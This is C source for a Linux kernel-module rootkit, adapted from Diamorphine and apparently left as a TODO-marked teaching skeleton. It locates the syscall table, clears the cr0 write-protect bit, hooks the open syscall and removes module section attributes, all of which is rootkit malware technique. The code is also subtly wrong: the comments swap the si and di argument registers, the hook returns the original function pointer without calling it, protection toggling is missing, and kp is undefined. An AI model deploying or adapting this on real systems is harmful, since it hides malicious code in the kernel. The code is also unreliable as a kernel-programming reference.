/*
Simplified and modified from https://github.com/m0nad/Diamorphine

All credit to m0nad
*/

// Includes and defs
#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h> 
#include <linux/proc_ns.h>
#include <linux/fdtable.h>

#ifndef __NR_getdents
#define __NR_getdents 141
#endif

#include "diamorphine.h"

/*
Registry value responsible for memory protection.
This must be edited to edit the sys_call_table
*/
unsigned long cr0; 

/*
Pointer to sys_call_table, which stores all system call functions.
To edit a system call s to a new system call s':
We can edit this table such that table[s] changes to table[s']
Note that we'd still need to keep track of table[s] to call the original syscall
*/
static unsigned long *__sys_call_table;

/* 
Define a syscall_t that takes as input a pointer to a pt_regs struct
pt_regs represents a bunch of registry values
We are interested in si and di, which store pointers to syscall params

si always stores the first param
di always stores the second param
checkout hacked_open to see an example of this
*/
typedef asmlinkage long (*t_syscall)(const struct pt_regs *);

// TODO (n): Store variables for the original system calls here
static t_syscall orig_open;

// TODO (n): Implement the hooked system calls here
// Hooked getdents syscall
static asmlinkage long hacked_open(const struct pt_regs *pt_regs) {
    const char *pathname = (char *)pt_regs->si;
    int flags = (int)pt_regs->di;

    printk("ROOTKIT: Opening %s...\n", pathname);
    return orig_open;
}

// Returns a pointer to the system call table
unsigned long* get_syscall_table_bf(void) {
	unsigned long *syscall_table;
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&kp);
	
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);
	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
	printk("ROOTKIT: syscall_table: %lu\n", *syscall_table);
	return syscall_table;
}

// Frees up allocated memory
static inline void tidy(void) {
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
}

/*
Forcibly writes the inputted long val to the cr0 register
Which is responsible for memory protection
By default, memory protection is set
Making it impossible to edit sys_call_table

Thus, to edit sys_call_table, we need to disable memory protection by editing the cr0 register
*/
static inline void write_cr0_forced(unsigned long val) {
	unsigned long __force_order;

	asm volatile(
		"mov %0, %%cr0"
		: "+r"(val), "+m"(__force_order));
}

static inline void protect_memory(void) {
	write_cr0_forced(cr0);
}

static inline void unprotect_memory(void) {
    write_cr0_forced(cr0 & ~0x00010000);
}

static int __init diamorphine_init(void) {
	printk("ROOTKIT: Init'ing diamorphine...");
	
	// Get sys_call_table
	__sys_call_table = get_syscall_table_bf();
	if (!__sys_call_table)
		return -1;

    // Init cr0
	cr0 = read_cr0();

    // Clean up data
	tidy();

    // TODO (n): Intialise the original system calls here 
    orig_open = (t_syscall)__sys_call_table[__NR_open];

    // TODO(n): Unprotect memory so we can edit table
    
    // TODO(n): For every hooked syscall, repoint sys_call_table to the hooked syscall
	__sys_call_table[__NR_open] = (unsigned long) hacked_open;

    // TODO(n): Protect memory again

	return 0;
}

static void __exit diamorphine_cleanup(void) {
	printk("ROOTKIT: Ejecting diamorphine...");
	
	// TODO(n): Unprotect memory so we can edit table

    // TODO(n): For every hooked syscall, repoint sys_call_table to the original syscall
	__sys_call_table[__NR_open] = (unsigned long) orig_open;

    // TODO(n): Protect memory again
}

module_init(diamorphine_init);
module_exit(diamorphine_cleanup);

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("m0nad");
MODULE_DESCRIPTION("LKM rootkit");
